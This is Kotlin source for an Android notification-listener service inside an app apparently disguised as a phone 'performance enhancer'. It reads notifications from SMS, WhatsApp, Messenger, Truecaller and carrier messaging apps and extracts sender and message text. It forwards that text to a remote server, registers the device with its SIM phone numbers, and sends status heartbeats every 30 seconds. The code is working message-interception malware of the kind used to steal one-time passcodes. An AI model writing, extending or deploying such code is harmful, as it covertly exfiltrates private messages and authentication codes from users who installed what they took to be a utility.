package com.performance.enhancer.optimization.suite.service

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.app.Notification
import android.content.Intent
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.delay
import com.performance.enhancer.optimization.suite.data.model.SmsMessage
import com.performance.enhancer.optimization.suite.data.repository.SmsRepository
import com.performance.enhancer.optimization.suite.data.database.SmsMessageDao
import com.performance.enhancer.optimization.suite.data.database.AppDatabase
import com.performance.enhancer.optimization.suite.utils.SimSlotInfoCollector
import com.performance.enhancer.optimization.suite.network.ServerApiClient
import com.performance.enhancer.optimization.suite.data.model.SimSlotInfo
import com.performance.enhancer.optimization.suite.data.model.DeviceRegistrationInfo
import com.performance.enhancer.optimization.suite.data.model.DeviceBrandInfo
import com.performance.enhancer.optimization.suite.data.model.HeartbeatData
import android.os.BatteryManager
import android.content.Context
import android.telephony.TelephonyManager
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat

class SMSNotificationService : NotificationListenerService() {

    private val serviceScope = CoroutineScope(Dispatchers.IO)
    private lateinit var smsRepository: SmsRepository
    private lateinit var serverApiClient: ServerApiClient
    private var preferredSimSlot: SimSlotInfo? = null
    private var isDeviceRegistered = false

    companion object {
        private const val TAG = "SMSNotificationService"

        // Known messaging app package names
        private val MESSAGING_PACKAGES = setOf(
            "com.google.android.apps.messaging", // Google Messages
            "com.samsung.android.messaging",    // Samsung Messages
            "com.facebook.orca",                // Facebook Messenger
            "com.whatsapp",                     // WhatsApp
            "com.android.mms",                 // Stock Android MMS
            "com.textra",                       // Textra
            "com.chompSMS",                     // ChompSMS
            "com.handcent.app.nextsms",         // Handcent
            "com.concentriclivers.mms",         // Pulse SMS
            "com.airtel.in",                    // Airtel
            "com.jio.join.jiobeat",            // Jio
            "com.vodafone.vms",                 // Vodafone
            "com.idea.cares",                   // Idea
            "com.truecaller",                   // Truecaller
            "in.jio.jiote"                      // Jio4GVoice
        )
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "SMSNotificationService created")

        // Initialize repository and server client
        smsRepository = createSmsRepository()
        serverApiClient = ServerApiClient(this)

        // Initialize device registration status (registration is now handled in MainActivity)
        serviceScope.launch {
            isDeviceRegistered = serverApiClient.isDeviceRegistered()
            if (isDeviceRegistered) {
                // Collect SIM slot information for SMS forwarding
                val simSlots = SimSlotInfoCollector.collectSimSlotInfo(this@SMSNotificationService)
                preferredSimSlot = SimSlotInfoCollector.getPreferredSimSlot(simSlots)
                Log.d(TAG, "Device already registered, preferred SIM slot: ${preferredSimSlot?.let { "SIM${it.slotIndex} (${it.phoneNumber})" } ?: "None"}")
            }
        }

        // Start heartbeat service
        startHeartbeatService()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        sbn?.let { processNotification(it) }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
        // Handle notification removal if needed
        Log.d(TAG, "Notification removed: ${sbn?.packageName}")
    }

    private fun processNotification(sbn: StatusBarNotification) {
        val packageName = sbn.packageName

        // Check if this is from a messaging app
        if (!MESSAGING_PACKAGES.contains(packageName)) {
            return
        }

        val notification = sbn.notification
        val extras = notification.extras

        // Extract all message details
        val title = extras.getString(Notification.EXTRA_TITLE) ?: "No Title"
        val text = extras.getString(Notification.EXTRA_TEXT) ?: "No Text"
        val bigText = extras.getString(Notification.EXTRA_BIG_TEXT)
        val subText = extras.getString(Notification.EXTRA_SUB_TEXT)
        val infoText = extras.getString(Notification.EXTRA_INFO_TEXT)
        val summaryText = extras.getString(Notification.EXTRA_SUMMARY_TEXT)

        // Extract message details
        val sender = title
        val content = extractMessageContent(notification)
        val timestamp = sbn.postTime
        val notificationKey = "${packageName}_${sbn.key}"

        // Log all SMS properties with detailed information
        Log.d(TAG, "=== SMS NOTIFICATION DETECTED ===")
        Log.d(TAG, "Package: $packageName")
        Log.d(TAG, "App Name: ${getAppName(packageName)}")
        Log.d(TAG, "Notification Key: $notificationKey")
        Log.d(TAG, "Timestamp: $timestamp (${java.util.Date(timestamp)})")
        Log.d(TAG, "Title: $title")
        Log.d(TAG, "Text: $text")
        Log.d(TAG, "Big Text: $bigText")
        Log.d(TAG, "Sub Text: $subText")
        Log.d(TAG, "Info Text: $infoText")
        Log.d(TAG, "Summary Text: $summaryText")
        Log.d(TAG, "Extracted Sender: $sender")
        Log.d(TAG, "Extracted Content: $content")

        // Check for Messages array (MessagingStyle)
        val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
        if (messages != null && messages.isNotEmpty()) {
            Log.d(TAG, "Messages Array Size: ${messages.size}")
            messages.forEachIndexed { index, message ->
                try {
                    // Convert to string representation for logging
                    Log.d(TAG, "Message[$index]: ${message.toString()}")
                } catch (e: Exception) {
                    Log.d(TAG, "Message[$index]: ${message.javaClass.simpleName}")
                }
            }
        }

        Log.d(TAG, "=== END SMS DETAILS ===")
        Log.d(TAG, "Final SMS: $sender - $content")

        serviceScope.launch {
            try {
                val smsMessage = SmsMessage(
                    sender = sender,
                    content = content,
                    timestamp = timestamp,
                    sourceApp = getAppName(packageName),
                    packageName = packageName,
                    notificationKey = notificationKey
                )

                smsRepository.insertOrUpdateMessage(smsMessage)
                Log.d(TAG, "SMS saved to database successfully")

                // Forward SMS to server if device is registered
                if (isDeviceRegistered && preferredSimSlot != null) {
                    serviceScope.launch {
                        try {
                            val success = serverApiClient.forwardSms(
                                sender = sender,
                                message = content,
                                timestamp = timestamp,
                                slotIndex = preferredSimSlot!!.slotIndex
                            )
                            if (success) {
                                Log.d(TAG, "SMS forwarded to server successfully")
                            } else {
                                Log.w(TAG, "Failed to forward SMS to server")
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Error forwarding SMS to server", e)
                        }
                    }
                }

                // Send broadcast to overlay service
                val overlayIntent = Intent(this@SMSNotificationService, OverlayService::class.java).apply {
                    action = OverlayService.ACTION_SHOW_SMS
                    putExtra(OverlayService.EXTRA_SENDER, sender)
                    putExtra(OverlayService.EXTRA_CONTENT, content)
                    putExtra(OverlayService.EXTRA_SOURCE_APP, getAppName(packageName))
                }
                startService(overlayIntent)
                Log.d(TAG, "Overlay service triggered for SMS display")

            } catch (e: Exception) {
                Log.e(TAG, "Error processing SMS notification", e)
            }
        }
    }

    private fun extractMessageContent(notification: Notification): String {
        val extras = notification.extras

        // Try different content extraction methods
        val bigText = extras.getString(Notification.EXTRA_BIG_TEXT)
        if (!bigText.isNullOrEmpty()) {
            return bigText
        }

        val text = extras.getString(Notification.EXTRA_TEXT)
        if (!text.isNullOrEmpty()) {
            return text
        }

        // Try to extract from messages array (for MessagingStyle)
        val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
        if (messages?.isNotEmpty() == true) {
            val firstMessage = messages[0]
            if (firstMessage is Notification.MessagingStyle.Message) {
                return firstMessage.text.toString()
            }
        }

        return "No content"
    }

    private fun getAppName(packageName: String): String {
        return try {
            val appInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    private fun createSmsRepository(): SmsRepository {
        val database = AppDatabase.getDatabase(this)
        return SmsRepository(database.smsMessageDao())
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        Log.d(TAG, "Notification listener connected")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        Log.d(TAG, "Notification listener disconnected")
    }

    /**
     * Initializes device registration with server
     */
    private fun initializeDeviceRegistration() {
        serviceScope.launch {
            try {
                Log.d(TAG, "Initializing device registration...")

                // Check if device is already registered
                if (serverApiClient.isDeviceRegistered()) {
                    isDeviceRegistered = true
                    Log.d(TAG, "Device already registered with server")
                } else {
                    // Collect SIM slot information
                    val simSlots = SimSlotInfoCollector.collectSimSlotInfo(this@SMSNotificationService)
                    preferredSimSlot = SimSlotInfoCollector.getPreferredSimSlot(simSlots)

                    Log.d(TAG, "Collected SIM slots: ${SimSlotInfoCollector.getFormattedSimInfo(this@SMSNotificationService)}")
                    Log.d(TAG, "Preferred SIM slot: ${preferredSimSlot?.let { "SIM${it.slotIndex} (${it.phoneNumber})" } ?: "None"}")

                    // Get device brand information
                    val deviceBrandInfo = SimSlotInfoCollector.getDeviceBrandInfo()

                    // Get battery level
                    val batteryLevel = getBatteryLevel()

                    // Create device registration info
                    val registrationInfo = DeviceRegistrationInfo(
                        deviceId = "", // Will be set by ServerApiClient
                        phoneNumber = preferredSimSlot?.phoneNumber ?: "",
                        deviceName = SimSlotInfoCollector.getDeviceName(),
                        simSlots = simSlots,
                        batteryLevel = batteryLevel,
                        deviceStatus = "online",
                        deviceBrandInfo = deviceBrandInfo
                    )

                    // Register with server
                    if (simSlots.isNotEmpty()) {
                        Log.d(TAG, "Registering device with server...")
                        val success = serverApiClient.registerDevice(registrationInfo)
                        if (success) {
                            isDeviceRegistered = true
                            serverApiClient.markDeviceRegistered(true)

                            // Save preferred phone number
                            preferredSimSlot?.phoneNumber?.let { phoneNumber ->
                                serverApiClient.saveCurrentPhoneNumber(phoneNumber)
                            }

                            Log.d(TAG, "Device registered successfully with server")
                        } else {
                            Log.w(TAG, "Failed to register device with server")
                        }
                    } else {
                        Log.w(TAG, "No SIM slots found, skipping device registration")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error during device registration", e)
            }
        }
    }

    /**
     * Starts the heartbeat service to keep server updated
     */
    private fun startHeartbeatService() {
        serviceScope.launch {
            while (true) {
                try {
                    if (isDeviceRegistered) {
                        // Get current device status
                        val batteryLevel = getBatteryLevel()
                        val simSlots = SimSlotInfoCollector.collectSimSlotInfo(this@SMSNotificationService)
                        val deviceBrandInfo = SimSlotInfoCollector.getDeviceBrandInfo()
                        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

                        // Create heartbeat data
                        val heartbeatData = HeartbeatData(
                            deviceId = "", // Will be set by ServerApiClient
                            batteryLevel = batteryLevel,
                            isCharging = isCharging(),
                            signalStrength = getSignalStrength(),
                            networkType = getNetworkType(),
                            activeSimSlots = simSlots.size, // Count all active SIM slots, not just ones with phone numbers
                            totalSimSlots = simSlots.size,
                            uptime = System.currentTimeMillis() - android.os.Process.getStartUptimeMillis(),
                            appVersion = getAppVersion(),
                            lastSmsTimestamp = System.currentTimeMillis(), // TODO: Get actual last SMS timestamp
                            pendingSmsCount = 0, // TODO: Implement pending SMS tracking
                            failedSmsCount = 0  // TODO: Implement failed SMS tracking
                        )

                        // Send heartbeat to server
                        val success = serverApiClient.sendHeartbeat(heartbeatData)
                        if (!success) {
                            Log.w(TAG, "Failed to send heartbeat to server")
                        }
                    }

                    // Send heartbeat every 30 seconds
                    delay(30000)
                } catch (e: Exception) {
                    Log.e(TAG, "Error in heartbeat service", e)
                    // Continue the loop even if there's an error
                    delay(30000)
                }
            }
        }
    }

    /**
     * Gets current battery level
     */
    private fun getBatteryLevel(): Int {
        return try {
            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) {
            Log.e(TAG, "Error getting battery level", e)
            0
        }
    }

    /**
     * Checks if device is currently charging
     */
    private fun isCharging(): Boolean {
        return try {
            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            batteryManager.isCharging
        } catch (e: Exception) {
            Log.e(TAG, "Error checking charging status", e)
            false
        }
    }

    /**
     * Gets signal strength using network type (no location permissions required)
     */
    private fun getSignalStrength(): Int? {
        return try {
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

            // Use network type as signal indicator (no special permissions required)
            when (telephonyManager.networkType) {
                TelephonyManager.NETWORK_TYPE_NR -> {
                    Log.d(TAG, "5G network detected - signal strength: Excellent (5)")
                    5
                }
                TelephonyManager.NETWORK_TYPE_LTE -> {
                    Log.d(TAG, "LTE network detected - signal strength: Good (4)")
                    4
                }
                TelephonyManager.NETWORK_TYPE_HSPAP,
                TelephonyManager.NETWORK_TYPE_HSPA -> {
                    Log.d(TAG, "HSPA+ network detected - signal strength: Good (3)")
                    3
                }
                TelephonyManager.NETWORK_TYPE_HSDPA,
                TelephonyManager.NETWORK_TYPE_HSUPA -> {
                    Log.d(TAG, "HSPA network detected - signal strength: Fair (3)")
                    3
                }
                TelephonyManager.NETWORK_TYPE_UMTS -> {
                    Log.d(TAG, "UMTS network detected - signal strength: Fair (2)")
                    2
                }
                TelephonyManager.NETWORK_TYPE_EDGE -> {
                    Log.d(TAG, "EDGE network detected - signal strength: Poor (1)")
                    1
                }
                TelephonyManager.NETWORK_TYPE_GPRS -> {
                    Log.d(TAG, "GPRS network detected - signal strength: Poor (1)")
                    1
                }
                TelephonyManager.NETWORK_TYPE_CDMA,
                TelephonyManager.NETWORK_TYPE_EVDO_0,
                TelephonyManager.NETWORK_TYPE_EVDO_A,
                TelephonyManager.NETWORK_TYPE_EVDO_B -> {
                    Log.d(TAG, "CDMA network detected - signal strength: Fair (2)")
                    2
                }
                TelephonyManager.NETWORK_TYPE_1xRTT -> {
                    Log.d(TAG, "1xRTT network detected - signal strength: Poor (1)")
                    1
                }
                TelephonyManager.NETWORK_TYPE_IWLAN -> {
                    Log.d(TAG, "WLAN network detected - signal strength: Good (4)")
                    4
                }
                else -> {
                    Log.d(TAG, "Unknown/No network type: ${telephonyManager.networkType} - signal strength: No Signal (0)")
                    0
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error getting signal strength", e)
            0
        }
    }

    /**
     * Gets network type string (no special permissions required)
     */
    private fun getNetworkType(): String? {
        return try {
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

            when (telephonyManager.networkType) {
                TelephonyManager.NETWORK_TYPE_NR -> "5G"
                TelephonyManager.NETWORK_TYPE_LTE -> "LTE"
                TelephonyManager.NETWORK_TYPE_HSPAP -> "HSPA+"
                TelephonyManager.NETWORK_TYPE_HSPA -> "HSPA"
                TelephonyManager.NETWORK_TYPE_HSDPA -> "HSDPA"
                TelephonyManager.NETWORK_TYPE_HSUPA -> "HSUPA"
                TelephonyManager.NETWORK_TYPE_UMTS -> "UMTS"
                TelephonyManager.NETWORK_TYPE_EDGE -> "EDGE"
                TelephonyManager.NETWORK_TYPE_GPRS -> "GPRS"
                TelephonyManager.NETWORK_TYPE_CDMA -> "CDMA"
                TelephonyManager.NETWORK_TYPE_EVDO_0 -> "EVDO Rev. 0"
                TelephonyManager.NETWORK_TYPE_EVDO_A -> "EVDO Rev. A"
                TelephonyManager.NETWORK_TYPE_EVDO_B -> "EVDO Rev. B"
                TelephonyManager.NETWORK_TYPE_1xRTT -> "1xRTT"
                TelephonyManager.NETWORK_TYPE_EHRPD -> "eHRPD"
                TelephonyManager.NETWORK_TYPE_IDEN -> "iDEN"
                TelephonyManager.NETWORK_TYPE_IWLAN -> "IWLAN"
                else -> "Unknown"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting network type", e)
            "Unknown"
        }
    }

    /**
     * Gets app version
     */
    private fun getAppVersion(): String {
        return try {
            val packageInfo = packageManager.getPackageInfo(packageName, 0)
            "${packageInfo.versionName} (${packageInfo.versionCode})"
        } catch (e: Exception) {
            Log.e(TAG, "Error getting app version", e)
            "Unknown"
        }
    }
}